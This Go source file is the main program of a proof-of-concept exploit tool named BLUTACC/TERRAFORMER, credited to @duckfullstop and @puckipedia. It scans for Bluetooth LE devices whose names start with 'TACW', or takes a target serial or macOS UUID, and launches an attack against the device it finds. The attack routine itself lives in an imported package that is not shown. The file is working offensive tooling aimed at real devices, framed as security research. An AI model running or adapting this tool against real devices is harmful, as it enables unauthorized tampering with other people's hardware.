package main

import (
	"errors"
	"flag"
	"github.com/duckfullstop/blutacc/pkg/terraformer"
	"log"
	"os"
	"strings"
	"tinygo.org/x/bluetooth"
)

var adapter = bluetooth.DefaultAdapter

func ScanAndAttack(scanOnly bool) (err error) {
	// init bluetooth
	err = adapter.Enable()
	if err != nil {
		log.Panic(err)
	}

	ch := make(chan bluetooth.ScanResult, 1)
	log.Print("🕵️Scanning for targets...")
	err = adapter.Scan(func(adapter *bluetooth.Adapter, result bluetooth.ScanResult) {
		if strings.HasPrefix(result.LocalName(), "TACW") {
			log.Printf("👀 Found %s (%s)", result.LocalName(), result.Address.String())
			ch <- result
		} else {
			log.Printf("😑 Found non-TACW %s (%s)", result.LocalName(), result.Address.String())
		}
	})

	if err != nil {
		return err
	}

	select {
	case result := <-ch:
		if !scanOnly {
			tacw, err := terraformer.BluetoothResultToTacw(result)
			if err != nil {
				return err
			}
			return attackTacw(tacw)
		}
	}

	return err
}

func Attack(target string, optSerialNumber string) (err error) {
	// init bluetooth
	err = adapter.Enable()
	if err != nil {
		log.Panic(err)
	}

	result := new(bluetooth.ScanResult)

	if target != "" {
		if !strings.HasPrefix(target, "TACW") {
			// This whole set of shenanigans is here because @duckfullstop's MacBook can't properly scan BTLE devices
			if optSerialNumber == "" {
				return errors.New("target serial number is required when connecting to bluetooth uuid")
			}
			// It's some other UUID, move to attack positions
			targetBTUUID, err := bluetooth.ParseUUID(target)
			if err != nil {
				return err
			}
			result = &bluetooth.ScanResult{
				Address:              bluetooth.Address{targetBTUUID},
				AdvertisementPayload: advertisementFields{AdvertisementFields: bluetooth.AdvertisementFields{LocalName: optSerialNumber}},
			}
		}
	} else {
		return errors.New("invalid target")
	}

	ch := make(chan bluetooth.ScanResult, 1)
	if result.Address == nil {
		// we need to find the target
		log.Printf("🕵️Scanning for target %s...", target)
		err = adapter.Scan(func(adapter *bluetooth.Adapter, result bluetooth.ScanResult) {
			if strings.HasPrefix(result.LocalName(), "TACW") {
				log.Printf("👀 Found %s (%s)", result.LocalName(), result.Address.String())
				if result.LocalName() == target {
					adapter.StopScan()
					ch <- result
				}
			} else {
				log.Printf("😑 Found non-TACW %s (%s)", result.LocalName(), result.Address.String())
			}
		})
	}

	if err != nil {
		return err
	}

	if result.Address != nil {
		tacw, err := terraformer.BluetoothResultToTacw(*result)
		if err != nil {
			return err
		}
		return attackTacw(tacw)
	}
	select {
	case result := <-ch:
		tacw, err := terraformer.BluetoothResultToTacw(result)
		if err != nil {
			return err
		}
		return attackTacw(tacw)
	}
}

func main() {
	log.Print("🚎 BLUTACC Exploit discovered by @duckfullstop & @puckipedia")
	log.Print("⚔️ TERRAFORMER Proof of Concept by @duckfullstop")
	log.Print("⚠️ WARNING: FOR RESEARCH PURPOSES ONLY - SEE LICENSE.md")

	flgsScan := flag.NewFlagSet("scan", flag.ExitOnError)
	flgSScanOnly := flgsScan.Bool("scanonly", false, "exit after listing all attackable targets")

	flgsTarget := flag.NewFlagSet("target", flag.ExitOnError)
	flgTTarget := flgsTarget.String("target", "", "target serial number (starts TACW*) or macOS BTLE UUID to attack")
	flgTTargetSerial := flgsTarget.String("serial", "", "if target is a macOS BTLE UUID, this must be set to the serial number of the target")

	if len(os.Args) < 2 {
		log.Println("😕 expect subcommand")
		os.Exit(1)
	}

	switch os.Args[1] {
	case "scan":
		flgsScan.Parse(os.Args[2:])
		log.Print("🕵 Scan Mode")
		if err := ScanAndAttack(*flgSScanOnly); err != nil {
			log.Printf("😭 Attack failed: %s", err)
		}

	case "target":
		flgsTarget.Parse(os.Args[2:])
		log.Print("🎯 Target Mode")
		if err := Attack(*flgTTarget, *flgTTargetSerial); err != nil {
			log.Printf("😭 Attack failed: %s", err)
		}
	case "help":
		log.Print("❤️ Available commands:")
	default:
		log.Printf("😕 Command %s is invalid - valid modes are 'scan' or 'target'", os.Args[1])
	}
}
